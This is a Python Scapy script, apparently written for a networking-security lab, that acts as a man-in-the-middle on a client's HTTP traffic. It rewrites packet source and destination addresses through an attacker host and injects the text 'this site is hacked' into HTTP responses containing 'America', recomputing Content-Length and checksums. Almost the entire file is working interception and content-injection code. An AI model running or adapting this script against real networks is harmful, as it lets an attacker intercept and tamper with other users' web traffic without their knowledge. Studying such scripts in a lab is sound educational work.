#!/usr/bin/env python3

from scapy.all import *

# Replace these with your actual IP addresses
CLIENT_IP = '10.0.2.4'   # The IP of your client
ATTACKER_IP = '10.0.2.6'  # The IP of the attacker
IFACE = "enp0s3"         # The Network interface to capture packets

def packet_callback(packet):
    print(f"Captured a packet ")
    # Check if the packet has a TCP layer and is an IP packet
    if packet.haslayer(TCP) and packet.haslayer(IP):
        # Handle packets going from the client to the server
        if packet[IP].src == CLIENT_IP and packet[TCP].dport == 80:
            dst_ip = packet[IP].dst
            print(f"going from {CLIENT_IP} to outside IP {dst_ip} using dport 80")
            # Modify the source IP to the gateway's IP
            print(f"send the packet from {CLIENT_IP} to outside IP {dst_ip} using dport 80")

            # Modify the IP layer, when we use bytes, this IP(bytes) contains the whole packet starting from IP to TCP to HTTP.
            # thus this ip_layer here is not just a header.
            ip_layer = IP(bytes(packet[IP]))
            ip_layer.src = ATTACKER_IP  # Change source IP to the gateway's IP

            # Recreate the packet with only the modified IP header and the existing payload
            new_packet = ip_layer

            print(f"Original Payload: {packet[Raw].load if packet.haslayer(Raw) else 'No Payload'}")
            print(f"IP Layer: {ip_layer}")
            print(f"New Packet: {new_packet.summary()}")

            # Recalculate checksum and length
            del new_packet[IP].len
            del new_packet[IP].chksum
            del new_packet[TCP].chksum

            # Send the modified packet
            send(new_packet, verbose=1)
        
        # Handle packets coming from the server to the client (HTTP Response), we should not change the source, otherwise te client will be confused, like, why am I talking to the GATEWAY?
        elif packet[IP].dst == ATTACKER_IP and packet[TCP].sport == 80:
            if packet.haslayer(Raw):
                # Modify the payload if it contains "America"
                payload = packet[Raw].load.decode(errors='ignore')
                print(f"Captured Payload: {payload}")

                # Check if the payload starts with an HTTP request or response
                if payload.startswith("GET ") or payload.startswith("POST "):
                    print("Captured HTTP Request")
                elif payload.startswith("HTTP/1.1 ") or payload.startswith("HTTP/2 "):
                    print("Captured HTTP Response")

                if "America" in payload:
                    print(f"Original Payload: {payload}")
                    new_payload = payload.replace("America", "America, this site is hacked.")
                    print(f"Modified Payload: {new_payload}")

                    # Split the HTTP header and body
                    header, body = payload.split("\r\n\r\n", 1)
                    new_body = new_payload.split("\r\n\r\n", 1)[1]  # Extract the new body after modification

                    # Calculate new content length
                    new_content_length = str(len(new_body))

                    # Update the 'Content-Length' field in the HTTP header
                    new_header = []
                    for line in header.split("\r\n"):
                        if line.startswith("Content-Length:"):
                           new_header.append(f"Content-Length: {new_content_length}")
                        else:
                           new_header.append(line)
                   
                    new_header = "\r\n".join(new_header) + "\r\n\r\n"

                    print(f"new header: {new_header}")
                    print(f"new body: {new_body}")
                    # Combine new headers with modified body
                    new_http_payload = new_header + new_body

                    # Create a new IP header (but don't include the entire IP packet!)
                    ip_layer = IP(src=packet[IP].src, dst=CLIENT_IP)  # Modify only the IP header

                    # Extract the TCP header without modification
                    tcp_layer = TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, 
                    seq=packet[TCP].seq, ack=packet[TCP].ack, flags=packet[TCP].flags)

                    # Create a new packet with the modified IP header, existing TCP header, and the new payload
                    # new_packet = ip_layer / tcp_layer / Raw(load=new_payload)
                    new_packet = ip_layer / tcp_layer / Raw(load=new_http_payload)
                    print(f"IP Layer: {ip_layer}")
                    print(f"New Packet: {new_packet.summary()}")

                    # ip_layer = IP(bytes(packet[IP]))
                    # ip_layer.dst = CLIENT_IP  # Change destination IP to the client IP

                    # Recreate the packet with only the modified IP header and the existing payload
                    # new_packet = ip_layer
                    # new_packet[Raw].load = new_payload

                    # Recalculate checksum and length
                    del new_packet[IP].len
                    del new_packet[IP].chksum
                    del new_packet[TCP].chksum

                    # Send the modified packet
                    send(new_packet)
                else:
                    # Modify the IP layer
                    ip_layer = IP(bytes(packet[IP]))
                    ip_layer.dst = CLIENT_IP  # Change destination IP to the client IP

                    # Recreate the packet with only the modified IP header and the existing payload
                    new_packet = ip_layer

                    # Recalculate checksum and length
                    del new_packet[IP].len
                    del new_packet[IP].chksum
                    del new_packet[TCP].chksum

                    # Forward unmodified packets
                    send(new_packet)
            else:
                # Modify the IP layer
                ip_layer = IP(bytes(packet[IP]))
                ip_layer.dst = CLIENT_IP  # Change destination IP to the client IP

                # Recreate the packet with only the modified IP header and the existing payload
                new_packet = ip_layer

                # Recalculate checksum and length
                del new_packet[IP].len
                del new_packet[IP].chksum
                del new_packet[TCP].chksum

                # Forward unmodified packets
                # Forward packets without modification
                send(new_packet)

# Custom filter to capture the desired TCP packets
filter_str = f'tcp and ((src host {CLIENT_IP} and dst port 80) or (dst host {ATTACKER_IP} and src port 80))'
# Sniff packets based on the custom filter
# store=0: This option tells Scapy not to store the captured packets in memory. Essentially, packets are processed and passed to the callback function specified by prn, but they are not saved for later use. This can be useful for reducing memory usage, especially when capturing a large volume of packets.
# store=1: This is the default behavior, where captured packets are stored in memory. If you set store to 1, packets are saved in a list, and you can access them later if needed.
sniff(filter=filter_str, prn=packet_callback, store=0, iface=IFACE)
